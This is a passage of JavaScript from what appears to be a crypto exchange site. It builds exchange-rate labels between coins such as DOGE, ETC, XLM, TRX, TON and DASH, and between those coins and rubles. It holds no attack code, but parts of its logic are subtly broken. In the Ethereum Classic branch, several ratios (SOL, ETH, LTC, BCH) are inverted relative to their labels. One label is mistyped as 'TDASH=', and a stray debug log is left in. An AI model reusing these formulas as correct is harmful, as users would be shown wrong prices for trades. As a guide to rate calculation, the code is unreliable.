                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOGE = ${ addedSpacesInNumbers((PRICE_DOGE * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_DOGE) ) } DOGE = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOGE = ${ addedSpacesInNumbers( Number(PRICE_DOGE) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOGE = ${ addedSpacesInNumbers( Number(PRICE_DOGE) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOGE = ${ addedSpacesInNumbers( Number(PRICE_DOGE) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_DOT) / Number(PRICE_DOGE) ) } DOGE = 1 DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_SOL) / Number(PRICE_DOGE) ) } DOGE = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOGE = ${ addedSpacesInNumbers( Number(PRICE_DOGE) / Number(PRICE_POL) ) } POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_DOGE) ) } DOGE = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOGE = ${ addedSpacesInNumbers( (Number(PRICE_DOGE) / Number(PRICE_ARB)).toFixed(5) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_DOGE) ) } DOGE = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_DOGE) ) } DOGE = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOGE = ${ addedSpacesInNumbers( (Number(PRICE_DOGE) / Number(PRICE_XRP)).toFixed(5) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOGE = ${ addedSpacesInNumbers( (Number(PRICE_DOGE) / Number(PRICE_DOGE)).toFixed(5) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_DOGE) ) } DOGE = 1 ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOGE = ${ addedSpacesInNumbers( (Number(PRICE_DOGE) / Number(PRICE_XLM)).toFixed(5) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOGE = ${ addedSpacesInNumbers( (Number(PRICE_DOGE) / Number(PRICE_TRX)).toFixed(5) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DOGE = ${ addedSpacesInNumbers( (Number(PRICE_DOGE) / Number(PRICE_TON)).toFixed(5) ) } TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `1 DOGE = ${((Number(PRICE_DOGE) / Number(PRICE_DASH)).toFixed(5))} DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `1 DOGE = ${((Number(PRICE_DOGE) / Number(PRICE_ZEC)).toFixed(5))} ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `1 DOGE = ${((Number(PRICE_DOGE) / Number(PRICE_BNB)).toFixed(5))} BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `1 DOGE = ${((Number(PRICE_DOGE) / Number(PRICE_XMR)).toFixed(5))} XMR`;
                    }

                } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETC = ${ addedSpacesInNumbers((PRICE_ETC * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_ETC) ) } ETC = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETC = ${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETC = ${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETC = ${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETC = ${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_DOT) ) } DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_SOL) ) } ETC = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETC = ${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_POL) ) } POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_ETH) ) } ETC = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETC = ${ addedSpacesInNumbers( (Number(PRICE_ETC) / Number(PRICE_ARB)).toFixed(2) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_LTC) ) } ETC = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_BCH) ) } ETC = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETC = ${ addedSpacesInNumbers( (Number(PRICE_ETC) / Number(PRICE_XRP)).toFixed(2) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETC = ${ addedSpacesInNumbers( (Number(PRICE_ETC) / Number(PRICE_DOGE)).toFixed(2) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETC = ${ addedSpacesInNumbers( (Number(PRICE_ETC) / Number(PRICE_ETC)).toFixed(2) ) } ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETC = ${ addedSpacesInNumbers( (Number(PRICE_ETC) / Number(PRICE_XLM)).toFixed(2) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETC = ${ addedSpacesInNumbers( (Number(PRICE_ETC) / Number(PRICE_TRX)).toFixed(2) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ETC = ${ addedSpacesInNumbers( (Number(PRICE_ETC) / Number(PRICE_TON)).toFixed(2) ) } TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `1 ETC = ${addedSpacesInNumbers((Number(PRICE_ETC) / Number(PRICE_DASH)).toFixed(2))} DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `1 ETC = ${addedSpacesInNumbers((Number(PRICE_ETC) / Number(PRICE_ZEC)).toFixed(2))} ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `1 ETC = ${addedSpacesInNumbers((Number(PRICE_ETC) / Number(PRICE_BNB)).toFixed(2))} BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `1 ETC = ${addedSpacesInNumbers((Number(PRICE_ETC) / Number(PRICE_XMR)).toFixed(2))} XMR`;
                    }

                } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 XLM = ${ addedSpacesInNumbers((PRICE_XLM * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_XLM) ) } XLM = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XLM = ${ addedSpacesInNumbers( Number(PRICE_XLM) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XLM = ${ addedSpacesInNumbers( Number(PRICE_XLM) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XLM = ${ addedSpacesInNumbers( Number(PRICE_XLM) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_DOT) / Number(PRICE_XLM) ) } XLM = 1 DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_SOL) / Number(PRICE_XLM) ) } XLM = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XLM = ${ addedSpacesInNumbers( Number(PRICE_XLM) / Number(PRICE_POL) ) } POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_XLM) ) } XLM = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XLM = ${ addedSpacesInNumbers( (Number(PRICE_XLM) / Number(PRICE_ARB)).toFixed(5) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_XLM) ) } XLM = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_XLM) ) } XLM = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XLM = ${ addedSpacesInNumbers( (Number(PRICE_XLM) / Number(PRICE_XRP)).toFixed(5) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XLM = ${ addedSpacesInNumbers( (Number(PRICE_XLM) / Number(PRICE_DOGE)).toFixed(5) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_XLM) ) } XLM = 1 ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XLM = ${ addedSpacesInNumbers( (Number(PRICE_XLM) / Number(PRICE_XLM)).toFixed(5) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XLM = ${ addedSpacesInNumbers( (Number(PRICE_XLM) / Number(PRICE_TRX)).toFixed(5) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XLM = ${ addedSpacesInNumbers( (Number(PRICE_XLM) / Number(PRICE_TON)).toFixed(5) ) } TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `1 XLM = ${((Number(PRICE_XLM) / Number(PRICE_DASH)).toFixed(5))} DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `1 XLM = ${((Number(PRICE_XLM) / Number(PRICE_ZEC)).toFixed(5))} ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `1 XLM = ${((Number(PRICE_XLM) / Number(PRICE_BNB)).toFixed(5))} BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `1 XLM = ${((Number(PRICE_XLM) / Number(PRICE_XMR)).toFixed(5))} XMR`;
                    }

                } else if ( valuteFirstName == 'Tron (TRX)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 TRX = ${ addedSpacesInNumbers((PRICE_TRX * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_TRX) ) } TRX = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TRX = ${ addedSpacesInNumbers( Number(PRICE_TRX) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TRX = ${ addedSpacesInNumbers( Number(PRICE_TRX) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TRX = ${ addedSpacesInNumbers( Number(PRICE_TRX) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_DOT) / Number(PRICE_TRX) ) } TRX = 1 DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_SOL) / Number(PRICE_TRX) ) } TRX = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TRX = ${ addedSpacesInNumbers( Number(PRICE_TRX) / Number(PRICE_POL) ) } POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_TRX) ) } TRX = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TRX = ${ addedSpacesInNumbers( (Number(PRICE_TRX) / Number(PRICE_ARB)).toFixed(5) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_TRX) ) } TRX = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_TRX) ) } TRX = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TRX = ${ addedSpacesInNumbers( (Number(PRICE_TRX) / Number(PRICE_XRP)).toFixed(5) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TRX = ${ addedSpacesInNumbers( (Number(PRICE_TRX) / Number(PRICE_DOGE)).toFixed(5) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_TRX) ) } TRX = 1 ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TRX = ${ addedSpacesInNumbers( (Number(PRICE_TRX) / Number(PRICE_XLM)).toFixed(5) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TRX = ${ addedSpacesInNumbers( (Number(PRICE_TRX) / Number(PRICE_TRX)).toFixed(5) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TRX = ${ addedSpacesInNumbers( (Number(PRICE_TRX) / Number(PRICE_TON)).toFixed(5) ) } TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `1 TRX = ${((Number(PRICE_TRX) / Number(PRICE_DASH)).toFixed(5))} DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `1 TRX = ${((Number(PRICE_TRX) / Number(PRICE_ZEC)).toFixed(5))} ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `1 TRX = ${((Number(PRICE_TRX) / Number(PRICE_BNB)).toFixed(5))} BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `1 TRX = ${((Number(PRICE_TRX) / Number(PRICE_XMR)).toFixed(5))} XMR`;
                    }

                } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 TON = ${ addedSpacesInNumbers((PRICE_TON * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_TON) ) } TON = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TON = ${ addedSpacesInNumbers( Number(PRICE_TON) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TON = ${ addedSpacesInNumbers( Number(PRICE_TON) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TON = ${ addedSpacesInNumbers( Number(PRICE_TON) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_DOT) / Number(PRICE_TON) ) } TON = 1 DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_SOL) / Number(PRICE_TON) ) } TON = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TON = ${ addedSpacesInNumbers( Number(PRICE_TON) / Number(PRICE_POL) ) } POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_TON) ) } TON = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TON = ${ addedSpacesInNumbers( (Number(PRICE_TON) / Number(PRICE_ARB)).toFixed(5) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_TON) ) } TON = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_TON) ) } TON = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TON = ${ addedSpacesInNumbers( (Number(PRICE_TON) / Number(PRICE_XRP)).toFixed(5) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TON = ${ addedSpacesInNumbers( (Number(PRICE_TON) / Number(PRICE_DOGE)).toFixed(5) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_TON) ) } TON = 1 ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TON = ${ addedSpacesInNumbers( (Number(PRICE_TON) / Number(PRICE_XLM)).toFixed(5) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TON = ${ addedSpacesInNumbers( (Number(PRICE_TON) / Number(PRICE_TRX)).toFixed(5) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 TON = ${ addedSpacesInNumbers( (Number(PRICE_TON) / Number(PRICE_TON)).toFixed(5) ) } TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `1 TON = ${((Number(PRICE_TON) / Number(PRICE_DASH)).toFixed(5))} DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `1 TON = ${((Number(PRICE_TON) / Number(PRICE_ZEC)).toFixed(5))} ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `1 TON = ${((Number(PRICE_TON) / Number(PRICE_BNB)).toFixed(5))} BNB`;
                        console.log('hey');
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `1 TON = ${((Number(PRICE_TON) / Number(PRICE_XMR)).toFixed(5))} XMR`;
                    }

                } else if ( valuteFirstName == 'Dash (DASH)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 DASH = ${ addedSpacesInNumbers((PRICE_DASH * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_DASH) ) } TDASH= 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DASH = ${ addedSpacesInNumbers( Number(PRICE_DASH) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DASH = ${ addedSpacesInNumbers( Number(PRICE_DASH) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DASH = ${ addedSpacesInNumbers( Number(PRICE_DASH) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_DOT) / Number(PRICE_DASH) ) } DASH = 1 DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_SOL) / Number(PRICE_DASH) ) } DASH = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DASH = ${ addedSpacesInNumbers( Number(PRICE_DASH) / Number(PRICE_POL) ) } POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_DASH) ) } DASH = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DASH = ${ addedSpacesInNumbers( (Number(PRICE_DASH) / Number(PRICE_ARB)).toFixed(5) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_DASH) ) } DASH = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_DASH) ) } DASH = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DASH = ${ addedSpacesInNumbers( (Number(PRICE_DASH) / Number(PRICE_XRP)).toFixed(5) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DASH = ${ addedSpacesInNumbers( (Number(PRICE_DASH) / Number(PRICE_DOGE)).toFixed(5) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
